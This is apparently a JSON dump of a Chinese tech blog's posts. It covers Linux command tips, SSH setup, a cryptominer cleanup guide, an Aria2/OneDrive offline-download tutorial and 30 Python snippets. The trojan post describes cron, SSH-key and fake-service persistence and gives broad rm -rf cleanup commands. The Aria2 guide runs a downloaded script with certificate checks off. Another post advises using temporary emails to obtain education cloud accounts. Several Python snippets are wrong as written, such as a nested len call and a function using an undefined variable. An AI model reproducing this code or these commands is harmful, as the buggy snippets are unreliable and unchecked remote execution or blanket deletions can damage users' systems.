\n\n\n\n如果你不知道什么是sudo，戳这里。\n暂停并在后台运行命令我曾经写过一篇如何在终端后台运行命令的指南。\nCTRL + Z -暂停应用程序\nfg -重新将程序唤到前台\n如何使用这个技巧呢?\n试想你正用nano编辑一个文件：\nsudo nano abc.txt文件编辑到一半你意识到你需要马上在终端输入些命令，但是nano在前台运行让你不能输入。\n你可能觉得唯一的方法就是保存文件，退出nano，运行命令以后在重新打开nano。\n其实你只要按CTRL + Z，前台的命令就会暂停，画面就切回到命令行了。然后你就能运行你想要运行命令，等命令运行完后在终端窗口输入”fg”就可以回到先前暂停的任务。\n有一个尝试非常有趣就是用nano打开文件，输入一些东西然后暂停会话。再用nano打开另一个文件，输入一些什么后再暂停会话。如果你输入”fg”你将回到第二个用nano打开的文件。只有退出nano再输入”fg”，你才会回到***个用nano打开的文件。\n使用nohup在登出SSH会话后仍运行命令如果你用ssh登录别的机器时，nohup命令真的非常有用。\n那么怎么使用nohup呢?\n想象一下你使用ssh远程登录到另一台电脑上，你运行了一条非常耗时的命令然后退出了ssh会话，不过命令仍在执行。而nohup可以将这一场景变成现实。\n举个例子，因为测试的需要，我用我的树莓派来下载发行版。我绝对不会给我的树莓派外接显示器、键盘或鼠标。\n一般我总是用SSH从笔记本电脑连接到树莓派。如果我在不用nohup的情况下使用树莓派下载大型文件，那我就必须等待到下载完成后，才能登出ssh会话关掉笔记本。可如果是这样，那我为什么要使用树莓派下文件呢?\n使用nohup的方法也很简单，只需如下例中在nohup后输入要执行的命令即可：\nnohup wget http://mirror.is.co.za/mirrors/linuxmint.com/iso//stable/17.1/linuxmint-17.1-cinnamon-64bit.iso &amp; \n\n‘在’特定的时间运行Linux命令‘nohup’命令在你用SSH连接到服务器，并在上面保持执行SSH登出前任务的时候十分有用。\n想一下如果你需要在特定的时间执行相同的命令，这种情况该怎么办呢?\n命令’at’就能妥善解决这一情况。以下是’at’使用示例。\nat 10:38 PM Friat&gt; cowsay ‘hello’ at&gt; CTRL + D上面的命令能在周五下午10时38分运行程序cowsay。\n使用的语法就是’at’后追加日期时间。当at&gt;提示符出现后就可以输入你想在那个时间运行的命令了。\nCTRL + D返回终端。\n还有许多日期和时间的格式，都需要你好好翻一翻’at’的man手册来找到更多的使用方式。\nMan手册Man手册会为你列出命令和参数的使用大纲，教你如何使用她们。Man手册看起来沉闷呆板。(我思忖她们也不是被设计来娱乐我们的)。\n不过这不代表你不能做些什么来使她们变得漂亮些。\nexport PAGER=most你需要安装’most’;她会使你的你的man手册的色彩更加绚丽。\n你可以用以下命令给man手册设定指定的行长：\nexport MANWIDTH=80 ***，如果你有一个可用的浏览器，你可以使用-H在默认浏览器中打开任意的man页。\nman -H 注意啦，以上的命令只有在你将默认的浏览器设置到环境变量$BROWSER中了之后才效果哟。\n使用htop查看和管理进程你用哪个命令找出电脑上正在运行的进程的呢?我敢打赌是’ps’并在其后加不同的参数来得到你所想要的不同输出。\n安装’htop’吧!绝对让你相见恨晚。\nhtop在终端中将进程以列表的方式呈现，有点类似于Windows中的任务管理器。你可以使用功能键的组合来切换排列的方式和展示出来的项。你也可以在htop中直接杀死进程。\n在终端中简单的输入htop即可运行。\nhtop \n\n使用ranger浏览文件系统如果说htop是命令行进程控制的好帮手，那么ranger就是命令行浏览文件系统的好帮手。\n你在用之前可能需要先安装，不过一旦安装了以后就可以在命令行输入以下命令启动她：\nranger在命令行窗口中ranger和一些别的文件管理器很像，但是相比上下结构布局，她是左右结构的，这意味着你按左方向键你将前进到上一个文件夹，而右方向键则会切换到下一个。\n在使用前ranger的man手册还是值得一读的，这样你就可以用快捷键操作ranger了。\n取消关机无论是在命令行还是图形用户界面关机后，才发现自己不是真的想要关机。\nshutdown -c需要注意的是，如果关机已经开始则有可能来不及停止关机。\n以下是另一个可以尝试命令：\npkill shutdown \n\n杀死挂起进程的简单方法想象一下，你正在运行的应用程序不明原因的僵死了。\n你可以使用‘ps -ef’来找到该进程后杀掉或者使用‘htop’。\n有一个更快、更容易的命令叫做xkill。\n简单的在终端中输入以下命令并在窗口中点击你想杀死的应用程序。\nxkill那如果整个系统挂掉了怎么办呢?\n按住键盘上的‘alt’和‘sysrq’不放，然后慢慢输入以下键：\nREISUB \n\n\n\n这样不按电源键你的计算机也能重启了。\n下载Youtube视频一般来说我们大多数人都喜欢看Youtube的视频，也会通过钟爱的播放器播放Youtube的流媒体。\n如果你需要离线一段时间(比如：从苏格兰南部坐飞机到英格兰南部旅游的这段时间)那么你可能希望下载一些视频到存储设备中，到闲暇时观看。\n你所要做的就是从包管理器中安装youtube-dl。\n你可以用以下命令使用youtube-dl：\nyoutube-dl url-to-video \n\n\n\n你可以在Youtubu视频页面点击分享链接得到视频的url。只要简单的复制链接在粘帖到命令行就行了(要用shift + insert快捷键哟)。\n总结希望你在这篇文章中得到帮助，并且在这11条中找到至少一条让你惊叹“原来可以这样”的技巧。\n","categories":["Linux","命令行"],"tags":["Linux","Shell","终端命令","命令行技巧","htop","ranger"]},{"title":"Linux在CLI下连接WiFi","url":"/posts/58864.html","content":"\n\n\n系统安装好后，有线与线连接都可以使用， 切换联网方式执行要使用”ifdown 对应的网卡名称“或者”ifup 对应的网卡名称“这两条命令即可。\n使用 nmcli命令，查看各网卡的状态。得知无线网卡已经被驱动起来，并且已经纳入NetworkManager的管理。\n[root@localhost ~]# nmcli dev statusDEVICE      TYPE      STATE   CONNECTION   wlp3s0b1    wifi      连接的  Daoji_Studio virbr0      bridge    连接的  virbr0       enp2s0      ethernet  不可用  --           lo          loopback  未托管  --           virbr0-nic  tun       未托管  --           \n\n这是我的WiFi连接情况 \n如果无线网卡没有被纳入NetworkManager的管理，则可以安装”NetworkManager-wifi” ，命令如下。 \n1.设置NetworkManager自动启动 \nchkconfig NetworkManager on\n\n2.安装NetworkManager-wifi \nyum -y install NetworkManager-wifi\n\n运行这条命令后重启centos。进入系统后，打开NetworkManager，设置好WiFi后，就可以连接到WiFi了。上述步骤进行完以后，若WIFI仍然没开启，或者启动后无法自动连接WiFi，可以这样开启WIFI: \nnmcli r wifi on // 开启WIFInmcli dev wifi //扫描可用WIFInmcli dev wifi connect password // 连接WIFI\n","categories":["Linux","网络配置"],"tags":["Linux","WiFi","命令行","nmcli","NetworkManager"]},{"title":"CentOS 7安装SSH","url":"/posts/43991.html","content":"\n\n\nVPS上可能没有安装桌面，但一般来说都会安装ssh，并且防火墙默认开放22端口。那就从ssh开始。\n# 安装ssh，默认已安装好# yum install ssh# 启动ssh服务器端# service sshd start\n\nssh登陆如果本地端是Linux\n# ssh root@192.168.1.1\n\n其中root表示的是登录用户名，192.168.1.1为主机的IP地址，当然也可以使用主机名、域名来指代IP地址。\n# ssh 192.168.1.1\n\n则会以当前客户端的用户名进行登录。\nssh无密码登录但是每次输入密码登录十分麻烦，有没有一种方式可以让服务器能够确定我的身份，无需输入密码可以直接通过认证？\nssh除了使用密码验证外，还提供了一种公私密钥的验证方式。客户端生成一个私钥，并生成一个与之对应的公钥，然后将公钥上传到服务器上。下面是Linux示例。\n在客户端生成私钥、公钥（注意，在客户端完成）：# ssh-keygen -t rsa\n\n-t 指定要创建的密钥类型，默认就是rsa了，所以只执行ssh-keygen是一样的。\n期间会提示你输入你私钥的加密密码。如果需要完全脱离密码，此处可留空，直接回车，否则以后每次连接需要本地解锁。\n完成后，会当前用户的主目录下的~/.ssh/路径下生成两个文件id_rsa与id_rsa.pub分别是私钥与公钥。\n接下来，要把生成的公钥上传到服务器上，同样还是在客户端执行以下的代码。\n# ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.1.1\n\n其中root可以修改为你想要自动登录的服务器端用户名，192.168.1.1修改为你的VPS主机名或IP地址。\n最后，ssh登录远程服务器。# ssh root@192.168.1.1\n\n此时就不需要密码就可以登录了。\n","categories":["Linux","服务器"],"tags":["Linux","SSH","CentOS","OpenSSH","免密登录"]},{"title":"Linux抓出背后的木马程序并处理","url":"/posts/19424.html","content":"\n\n\n·通过top命令查看进程情况top  \n\n获取pid后可以用kill [PID]来关闭进程​    \n·通过进程查询异常程序所在目录通过执行ll /proc/$PID/exe，($PID即进程ID)可获得异常进程的目录    \n    \n此程序一般是由计划任务产生的，Linux系统中默认创建了计划任务后会在/var/spool/cron目录下创建对应用户的计划任务脚本，执行ls /var/spool/cron 查询一下系统中是否有异常的计划任务脚本程序。可以看到，在此目录下有1个root的计划任务脚本和一个异常的目录crontabs（默认情况下不会有此目录，用户创建计划任务也不会产生此目录） \n  \n查看脚本内容，有一个每隔10分钟便会通过curl下载执行的脚本程序（crontabs目录下为同样内容的计划任务）  \n\n手动将脚本内容下载到本地，脚本内容如下\n\n分析此脚本，主要进行了如下修改1、创建了上述查看到的两个计划任务脚本2、创建了密钥认证文件，导入到了/root/.ssh目录下（当前脚本的密钥文件名是KHK75NEOiq，此名称可能会有所变化，要根据具体情况进行核实）3、修改ssh配置文件允许了root远程登录，允许了密钥认证，修改默认的密钥认证文件名4、重启了sshd服务使配置生效5、创建了伪装程序ntp，并运行了ntp程序6、查询系统中是否有正常运行的计划任务，杀死正在运行的计划任务进程。  \n【处理方法】根据以上分析，提供以下处理方法1、删除计划任务脚本中异常配置项，如果当前系统之前并未配置过计划任务，可以直接执行rm -rf /var/spool/cron/* 情况计划脚本目录即可。2、删除黑客创建的密钥认证文件，如果当前系统之前并未配置过密钥认证，可以直接执行rm -rf /root/.ssh/* 清空认证存放目录即可。如果有配置过密钥认证，需要删除指定的黑客创建的认证文件即可，当前脚本的密钥文件名是KHK75NEOiq，此名称可能会有所变化，要根据具体情况进行核实。3、修复ssh配置项，根据个人需求进行修改，一般默认脚本中进行修改的PermitRootLogin、RSAAuthentication、PubkeyAuthentication为开启状态，需要修改的是密钥认证文件名，建议修改成默认值AuthorizedKeysFile .ssh/authorized_keys即可。修改完成后重启sshd服务，使配置生效即可。4、删除黑客创建的伪装程序ntp执行ls /etc/init.d/可以看到系统中是由对应的伪装程序的  \n\n通过chkconfig –list ntp 可以看到此程序默认设置的是开机自动启动\n\n如果此程序不进行清除，即使删除了minerd程序并且杀死了对应的进程，过一会系统还会重新创建minerd程序，并产生新的进程查询一下当前系统中是否有ntp进程，可以看到ntp进程是通过/usr/sbin/ntp程序产生，因此需要把对应的执行程序也进行删除\n\n总结一下删除伪装程序的操作步骤  \nkill -9 $PID 杀死查询到的ntp进程  rm -rf /etc/init.d/ntp  rm -rf /usr/sbin/ntp （此路径要根据具体的查询数据确定，实际情况可能会有所变化）  \n\n\n\n·删除异常程序并关闭异常进程根据之前的查询minerd程序所在路径为/opt，在执行的脚本中同时也在/opt目录下创建了一个KHK75NEOiq33的程序文件\n因此要删除这两个文件，执行rm -rf KHK75NEOiq33 minerd 即可\n\nkill -9 $PID 杀死对应的进程ID \n通过ps命令查询一下minerd对应的进程详细情况​    ps -aux|grep minerd\n·修改SSH端口以及采用（字母+符号+数字=密码）的方式登录·适当时可以考虑一下网上的防爆破SSH脚本或程序","categories":["Linux","安全运维"],"tags":["Linux","安全","木马","挖矿病毒","系统安全"]},{"title":"Linux通过ps -ef过滤进程获得行数","url":"/posts/43992.html","content":"Linux通过ps -ef过滤进程获得行数\ncount=`ps -fe |grep &quot;one.php&quot; | grep -v &quot;grep&quot; | wc -l`\n\n获取行数并赋值给count。\n","categories":["Linux","Shell编程"],"tags":["Linux","Shell","脚本","ps","grep","wc"]},{"title":"使用Speedtest进行带宽测速","url":"/posts/18198.html","content":"使用Speedtest进行带宽测速\nwget -O speedtest-cli https://raw.github.com/sivel/speedtest-cli/master/speedtest.pychmod +x speedtest-cli\n\n\nwget https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.pychmod a+rx speedtest.pymv speedtest.py /usr/local/bin/speedtest-clichown root:root /usr/local/bin/speedtest-clispeedtest-cli\n","categories":["Linux","工具"],"tags":["Linux","Shell","Speedtest","网络工具","带宽测试"]},{"title":"没有收获到预期的成果只能怪我还不够努力","url":"/posts/43265.html","content":"\n\n\n考试失利&emsp;&emsp;以为我学的很好了，但是笔试的时候却不理想，那么简单的一道题，到头来还是做错了，一转身就发现错误的那种简单的题。反思过后，觉得我不是学的不好，是用的太少，缺乏实践经验。\n追求极致&emsp;&emsp;我说的追求极致，也不是非要到一个很高的顶点，但是至少也要有一定成就，有一定的量。没有积累的知识，到头来只是一个空壳。昨天群里的小伙伴推荐给我TS，今天又在学Flutter了，之前推给我Vue.js后来又推给我Angular 。一个人的精力是有限的，我也意识到了，但是我还是没掌握好。\n&emsp;&emsp;无论学习什么，要去掌握好一门知识，真的不是表面就行的。实践、操作后才能真正掌握好。\n\n告诫：学习要追求深层次的理解，不要停留在只是会用的地步，才能真正的接近大神，没有第二条道路可走。\n\n","categories":["随笔"],"tags":["随笔","成长","思考","学习方法"]},{"title":"离线网盘搭建教程","url":"/posts/55012.html","content":"\n\n\nAria2+AriaNg+OneIndex(+rclone)示例免费临时邮箱过office365\n\n\n\n一、获得5T的OneDrive网盘账号 点击上面的链接获取临时邮箱，然后按照图片的超链接去注册一个账号，直接就是OneDrive网盘教育版了，直接就有5T容量了。（或者去http://az.pl申请一个免费的edu.pl后缀的域名，自己搭建邮箱也能过office365教育版）\n二、安装Aria2\n**习惯了用CentOS，这里全程用CentOS 7来演示。**    \n安装Aria2这里推荐doub.io的一键脚本，方便快捷又好用。执行下面的代码下载并运行脚本。    \n\n\nwget -N --no-check-certificate https://softs.loan/Bash/aria2.sh &amp;&amp; chmod +x aria2.sh &amp;&amp; bash aria2.sh\n \n# 如果上面这个脚本无法下载，尝试使用备用下载：\nwget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/aria2.sh &amp;&amp; chmod +x aria2.sh &amp;&amp; bash aria2.sh\n\n\n\n\n启动：/etc/init.d/aria2 start\n停止：/etc/init.d/aria2 stop\n重启：/etc/init.d/aria2 restart\n查看状态：/etc/init.d/aria2 status\n配置文件：/root/.aria2/aria2.conf （配置文件包含中文注释，但是一些系统可能不支持显示中文）\n令牌密匙：随机生成（可以自己修改 6. 修改 配置文件）\n下载目录：/usr/local/caddy/www/aria2/Download\n\n\n\n三、部署AriaNg\n\nAria2用Linux指令来操作的话太麻烦，为了简化操作就用GUI面板来操作。\nAriaNg下载Github最新版下载地址​AriaNg可以像网站一样部署在服务器上，这里介绍最简单的用法。下载解压，找到文件夹里面的index.html双击打开。\n\n设置好之后就能远程下载种子磁力了。\n四、部署OneIndex\n\n部署OneIndex之前先安装运行环境。新手用宝塔https://www.bt.cn/非常方便。     \n然后就部署Oneindex网站源码，可以参照这篇文章部署OndeIndex。\n\nOneIndex是通过OneDrive的API管理的程序，既能做使用OneDrive做外链，又能快速上传文件到OneDrive，达到做离线下载，文件备份的目的。\n\n五、安装Rclone\n\n\nRclone是将OneDrive作为一个储存空间挂载在本地分区上，也就是将一个本地文件夹，关联OneDrive上的一个文件夹上，当本地文件移动到本地文件夹中，将会自动上传到OneDrive上。如果需求不大，可以选Oneindex或Rclone中的一个安装就行了。  \n\n安装方法可以参照这两篇文章《在于Debian / Ubuntu上使用rclone挂载OneDrive网盘》和《Centos7使用RCLONE挂载OneDrive搭建离线下载，在线播放》。\n六、一键上传脚本\n\nCentos7使用RCLONE挂载OneDrive搭建离线下载，在线播放  \n荒岛的自动上传\n使用Aria2 + ARIANG + oneindex + onedrive建立离线BT下载/在线播放\n临时邮箱地址\n一键脚本\n","categories":["Linux","建站"],"tags":["Web","Aria2","OneIndex","OneDrive","Rclone","离线下载"]},{"title":"线程同步锁Synchronized","url":"/posts/9083.html","content":"\n\n\n线程同步锁Synchronizedclass AccountingSync implements Runnable &#123;    static AccountingSync instance = new AccountingSync();    static int i = 0;    @Override    public void run() &#123;        //省略其他耗时操作....        while (true) &#123;            synchronized (AccountingSync.class) &#123;                if (i &lt; 100) &#123;                    i++;                    System.out.println(Thread.currentThread().getName() + &quot;    &quot;+ i);                &#125;            &#125;        &#125;    &#125;&#125;class test &#123;    public static void main(String[] args) &#123;        AccountingSync accountingSync = new AccountingSync();        Thread t1 = new Thread(accountingSync);        Thread t2 = new Thread(accountingSync);        t1.start();        t2.start();    &#125;&#125;","categories":["Java","并发"],"tags":["Java","多线程","并发编程","Synchronized"]},{"title":"自家Linux","url":"/posts/57501.html","content":"\n\n#centos7配置第一篇##GUI界面锁屏解除\n#设置-&gt;隐私-&gt;锁屏和通知  都关闭\n\n##CLI界面合盖休眠解除\nvi /etc/systemd/logind.conf\n#HandlePowerKey       //按下电源键后的行为，默认 =poweroff\n#HandleSuspendKey     //按下挂起键后的行为，默认 =suspend\n#HandleHibernateKey   //按下休眠键的行为，默认 =hibernate\n#HandleLidSwitch      //合上笔记本盖后的行为，默认 =suspend，应该改为 =lock，并且在文件中去除前面的#\n运行配置文件使其生效 ###\nsystemctl restart systemd-logind\n\n","categories":["Linux","系统管理"],"tags":["Linux","CentOS","系统配置","Gnome"]},{"title":"通过shell脚本查看python版本并比较","url":"/posts/14490.html","content":"#!/bin/shcheckPython()&#123;    #推荐版本V2.6.5    V1=2    V2=6    V3=5    echo need python version is : $V1.$V2.$V3    #获取本机python版本号。这里2&gt;&amp;1是必须的，python -V这个是标准错误输出的，需要转换    U_V1=`python -V 2&gt;&amp;1|awk &#x27;&#123;print $2&#125;&#x27;|awk -F &#x27;.&#x27; &#x27;&#123;print $1&#125;&#x27;`    U_V2=`python -V 2&gt;&amp;1|awk &#x27;&#123;print $2&#125;&#x27;|awk -F &#x27;.&#x27; &#x27;&#123;print $2&#125;&#x27;`    U_V3=`python -V 2&gt;&amp;1|awk &#x27;&#123;print $2&#125;&#x27;|awk -F &#x27;.&#x27; &#x27;&#123;print $3&#125;&#x27;`    echo your python version is : $U_V1.$U_V2.$U_V3    if [ $U_V1 -lt $V1 ];then        echo &#x27;Your python version is not OK!(1)&#x27;        exit 1    elif [ $U_V1 -eq $V1 ];then        if [ $U_V2 -lt $V2 ];then            echo &#x27;Your python version is not OK!(2)&#x27;            exit 1        elif [ $U_V2 -eq $V2 ];then            if [ $U_V3 -lt $V3 ];then                echo &#x27;Your python version is not OK!(3)&#x27;                exit 1            fi        fi    fi    echo Your python version is OK!&#125;checkPython\n","categories":["Linux","Shell编程"],"tags":["Python","Linux","Shell","脚本","版本比较"]},{"title":"30个Python极简代码，10分钟get常用技巧！","url":"/posts/34537.html","content":"1. 重复元素判定以下方法可以检查给定列表是不是存在重复元素，它会使用 set() 函数来移除所有重复元素。\ndef all_unique(lst):    return len(lst) == len(set(lst))x = [1,1,2,2,3,2,3,4,5,6]y = [1,2,3,4,5]all_unique(x) # Falseall_unique(y) # True\n\n2. 字符元素组成判定检查两个字符串的组成元素是不是一样的。\nfrom collections import Counterdef anagram(first, second):    return Counter(first) == Counter(second)anagram(&quot;abcd3&quot;, &quot;3acdb&quot;) # True\n\n3. 内存占用下面的代码块可以检查变量 variable 所占用的内存。\nimport sys variable = 30 print(sys.getsizeof(variable)) # 24\n\n4. 字节占用下面的代码块可以检查字符串占用的字节数。\ndef byte_size(string):    return(len(string.encode(&#x27;utf-8&#x27;)))byte_size(&#x27;😀&#x27;) # 4byte_size(&#x27;Hello World&#x27;) # 11   \n\n5. 打印 N 次字符串该代码块不需要循环语句就能打印 N 次字符串。\nn = 2; s =&quot;Programming&quot;; print(s * n);# ProgrammingProgramming  \n\n6. 大写第一个字母以下代码块会使用 title() 方法，从而大写字符串中每一个单词的首字母。\ns = &quot;programming is awesome&quot;print(s.title())# Programming Is Awesome\n\n7. 分块给定具体的大小，定义一个函数以按照这个大小切割列表。\nfrom math import ceildef chunk(lst, size):    return list(        map(lambda x: lst[x * size:x * size + size],            list(range(0, ceil(len(lst) / size)))))chunk([1,2,3,4,5],2)# [[1,2],[3,4],5]\n\n8. 压缩这个方法可以将布尔型的值去掉，例如（False，None，0，””），它使用 filter() 函数。\ndef compact(lst):    return list(filter(bool, lst))compact([0, 1, False, 2, &#x27;&#x27;, 3, &#x27;a&#x27;, &#x27;s&#x27;, 34])# [ 1, 2, 3, &#x27;a&#x27;, &#x27;s&#x27;, 34 ]\n\n9. 解包如下代码段可以将打包好的成对列表解开成两组不同的元组。\narray = [[&#x27;a&#x27;, &#x27;b&#x27;], [&#x27;c&#x27;, &#x27;d&#x27;], [&#x27;e&#x27;, &#x27;f&#x27;]]transposed = zip(*array)print(transposed)# [(&#x27;a&#x27;, &#x27;c&#x27;, &#x27;e&#x27;), (&#x27;b&#x27;, &#x27;d&#x27;, &#x27;f&#x27;)]\n\n10. 链式对比我们可以在一行代码中使用不同的运算符对比多个不同的元素。\na = 3print( 2 &lt; a &lt; 8) # Trueprint(1 == a &lt; 2) # False\n\n11. 逗号连接下面的代码可以将列表连接成单个字符串，且每一个元素间的分隔方式设置为了逗号。\nhobbies = [&quot;basketball&quot;, &quot;football&quot;, &quot;swimming&quot;]print(&quot;My hobbies are: &quot; + &quot;, &quot;.join(hobbies))# My hobbies are: basketball, football, swimming\n\n12. 元音统计以下方法将统计字符串中的元音 (‘a’, ‘e’, ‘i’, ‘o’, ‘u’) 的个数，它是通过正则表达式做的。\nimport redef count_vowels(str):    return len(len(re.findall(r&#x27;[aeiou]&#x27;, str, re.IGNORECASE)))count_vowels(&#x27;foobar&#x27;) # 3count_vowels(&#x27;gym&#x27;) # 0\n\n13. 首字母小写如下方法将令给定字符串的第一个字符统一为小写。\ndef decapitalize(string):    return str[:1].lower() + str[1:]decapitalize(&#x27;FooBar&#x27;) # &#x27;fooBar&#x27;decapitalize(&#x27;FooBar&#x27;) # &#x27;fooBar&#x27;\n\n14. 展开列表该方法将通过递归的方式将列表的嵌套展开为单个列表。\ndef spread(arg):    ret = []    for i in arg:        if isinstance(i, list):            ret.extend(i)        else:            ret.append(i)    return retdef deep_flatten(lst):    result = []    result.extend(        spread(list(map(lambda x: deep_flatten(x) if type(x) == list else x, lst))))    return resultdeep_flatten([1, [2], [[3], 4], 5]) # [1,2,3,4,5]\n\n15. 列表的差该方法将返回第一个列表的元素，其不在第二个列表内。如果同时要反馈第二个列表独有的元素，还需要加一句 set_b.difference(set_a)。\ndef difference(a, b):    set_a = set(a)    set_b = set(b)    comparison = set_a.difference(set_b)    return list(comparison)difference([1,2,3], [1,2,4]) # [3]\n\n16. 通过函数取差如下方法首先会应用一个给定的函数，然后再返回应用函数后结果有差别的列表元素。\ndef difference_by(a, b, fn):    b = set(map(fn, b))    return [item for item in a if fn(item) not in b]from math import floordifference_by([2.1, 1.2], [2.3, 3.4],floor) # [1.2]difference_by([&#123; &#x27;x&#x27;: 2 &#125;, &#123; &#x27;x&#x27;: 1 &#125;], [&#123; &#x27;x&#x27;: 1 &#125;], lambda v : v[&#x27;x&#x27;])# [ &#123; x: 2 &#125; ]\n\n17. 链式函数调用你可以在一行代码内调用多个函数。\ndef add(a, b):    return a + bdef subtract(a, b):    return a - ba, b = 4, 5print((subtract if a &gt; b else add)(a, b)) # 9 \n\n18. 检查重复项如下代码将检查两个列表是不是有重复项。\ndef has_duplicates(lst):    return len(lst) != len(set(lst))x = [1,2,3,4,5,5]y = [1,2,3,4,5]has_duplicates(x) # Truehas_duplicates(y) # False\n\n19. 合并两个字典下面的方法将用于合并两个字典。\ndef merge_two_dicts(a, b):    c = a.copy()   # make a copy of a     c.update(b)    # modify keys and values of a with the ones from b    return ca = &#123; &#x27;x&#x27;: 1, &#x27;y&#x27;: 2&#125;b = &#123; &#x27;y&#x27;: 3, &#x27;z&#x27;: 4&#125;print(merge_two_dicts(a, b))# &#123;&#x27;y&#x27;: 3, &#x27;x&#x27;: 1, &#x27;z&#x27;: 4&#125;\n\n在 Python 3.5 或更高版本中，我们也可以用以下方式合并字典：\ndef merge_dictionaries(a, b)   return &#123;**a, **b&#125;a = &#123; &#x27;x&#x27;: 1, &#x27;y&#x27;: 2&#125;b = &#123; &#x27;y&#x27;: 3, &#x27;z&#x27;: 4&#125;print(merge_dictionaries(a, b))# &#123;&#x27;y&#x27;: 3, &#x27;x&#x27;: 1, &#x27;z&#x27;: 4&#125;\n\n20. 将两个列表转化为字典如下方法将会把两个列表转化为单个字典。\ndef to_dictionary(keys, values):    return dict(zip(keys, values))keys = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]    values = [2, 3, 4]print(to_dictionary(keys, values))# &#123;&#x27;a&#x27;: 2, &#x27;c&#x27;: 4, &#x27;b&#x27;: 3&#125;\n\n21. 使用枚举我们常用 For 循环来遍历某个列表，同样我们也能枚举列表的索引与值。\nlist = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]for index, element in enumerate(list):     print(&quot;Value&quot;, element, &quot;Index &quot;, index, )# (&#x27;Value&#x27;, &#x27;a&#x27;, &#x27;Index &#x27;, 0)# (&#x27;Value&#x27;, &#x27;b&#x27;, &#x27;Index &#x27;, 1)#(&#x27;Value&#x27;, &#x27;c&#x27;, &#x27;Index &#x27;, 2)# (&#x27;Value&#x27;, &#x27;d&#x27;, &#x27;Index &#x27;, 3)    \n\n22. 执行时间如下代码块可以用来计算执行特定代码所花费的时间。\nimport timestart_time = time.time()a = 1b = 2c = a + bprint(c) #3end_time = time.time()total_time = end_time - start_timeprint(&quot;Time: &quot;, total_time)# (&#x27;Time: &#x27;, 1.1205673217773438e-05)  \n\n23.Try else我们在使用 try/except 语句的时候也可以加一个 else 子句，如果没有触发错误的话，这个子句就会被运行。\ntry:    2*3except TypeError:    print(&quot;An exception was raised&quot;)else:    print(&quot;Thank God, no exceptions were raised.&quot;)#Thank God, no exceptions were raised.\n\n24. 元素频率下面的方法会根据元素频率取列表中最常见的元素。\ndef most_frequent(list):    return max(set(list), key = list.count)list = [1,2,1,2,3,2,1,4,2]most_frequent(list)  \n\n25. 回文序列以下方法会检查给定的字符串是不是回文序列，它首先会把所有字母转化为小写，并移除非英文字母符号。最后，它会对比字符串与反向字符串是否相等，相等则表示为回文序列。\ndef palindrome(string):    from re import sub    s = sub(&#x27;[\\W_]&#x27;, &#x27;&#x27;, string.lower())    return s == s[::-1]palindrome(&#x27;taco cat&#x27;) # True\n\n26. 不使用 if-else 的计算子这一段代码可以不使用条件语句就实现加减乘除、求幂操作，它通过字典这一数据结构实现：\nimport operatoraction = &#123;    &quot;+&quot;: operator.add,    &quot;-&quot;: operator.sub,    &quot;/&quot;: operator.truediv,    &quot;*&quot;: operator.mul,    &quot;**&quot;: pow&#125;print(action[&#x27;-&#x27;](50, 25)) # 25\n\n27.Shuffle该算法会打乱列表元素的顺序，它主要会通过 Fisher-Yates 算法对新列表进行排序：\nfrom copy import deepcopyfrom random import randintdef shuffle(lst):    temp_lst = deepcopy(lst)    m = len(temp_lst)    while (m):        m -= 1        i = randint(0, m)        temp_lst[m], temp_lst[i] = temp_lst[i], temp_lst[m]    return temp_lstfoo = [1,2,3]shuffle(foo) # [2,3,1] , foo = [1,2,3]\n\n28. 展开列表将列表内的所有元素，包括子列表，都展开成一个列表。\ndef spread(arg):    ret = []    for i in arg:        if isinstance(i, list):            ret.extend(i)        else:            ret.append(i)    return retspread([1,2,3,[4,5,6],[7],8,9]) # [1,2,3,4,5,6,7,8,9]\n\n29. 交换值不需要额外的操作就能交换两个变量的值。\ndef swap(a, b):  return b, aa, b = -1, 14swap(a, b) # (14, -1)spread([1,2,3,[4,5,6],[7],8,9]) # [1,2,3,4,5,6,7,8,9]\n\n30. 字典默认值通过 Key 取对应的 Value 值，可以通过以下方式设置默认值。如果 get() 方法没有设置默认值，那么如果遇到不存在的 Key，则会返回 None。\nd = &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2&#125;print(d.get(&#x27;c&#x27;, 3)) # 3","categories":["Python"],"tags":["Python","编程技巧","代码片段","Pythonic"]},{"title":"Google Authoritarian/谷歌身份验证器原理","url":"/posts/2984.html","content":"\nTOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。 它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication（OATH）的基石，并被用于许多双因素身份验证系统。\nTOTP是基于散列的消息认证码（HMAC）的示例。 它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。\n\nTOTP算法使用场景&emsp;&emsp;TOTP算法的使用场景可以有动态口令认证、前后端接口认证等，TOTP算法需要客户端和服务端保持时钟一致(基于UTC时间)\n适用场景\n服务器登录动态密码验证\n公司VPN登录双因素验证\n银行转账动态密码\n网银、网络游戏的实体动态口令牌\n等基于时间有效性验证的应用场景\n\nTOTP的基本原理TOTP计算公式TOTP(K, TC) = Truncate(HMAC-SHA-1(K, TC))\n\nK，密钥串 HMAC-SHA-1， 表示使用SHA-1做HMAC（当然也可以使用SHA-256等） C，基于时间戳计算得出，通过定义纪元（T0）的开始并以时间间隔（TI）为单位计数，将当前时间戳变为整数时间计数器（TC） Truncate，是一个函数，用于截取加密后的字符串\nTC的计算公式TC = (T - T0) / T1;\n\nT，当前的时间戳 T0，起始时间，一般为0 T1，时间间隔，根据业务需要自定义\nTruncate函数\n取加密后的最后一个字节的的低4位，offset；\n以offset开始取4个字节，按照大端方式组成整数，binary；\n根据需要的长度对binary取模，opt\n以字符串方式返回opt，并补足长度\n\nh = hmac.new(self.key.encode(), msg, sha256).digest()offset = h[len(h)-1] &amp; 0xfbinary = (h[offset] &amp; 0x7f) &lt;&lt; 24binary = binary | ((h[offset+1] &amp; 0xff)&lt;&lt;16)binary = binary | ((h[offset+2] &amp; 0xff)&lt;&lt;8)binary = binary | (h[offset+3] &amp; 0xff)otp = binary % (10 ** self.codeDigits)return str(otp).rjust(self.codeDigits, &#x27;0&#x27;)\n\nPython实现import binasciiimport hmacimport timefrom 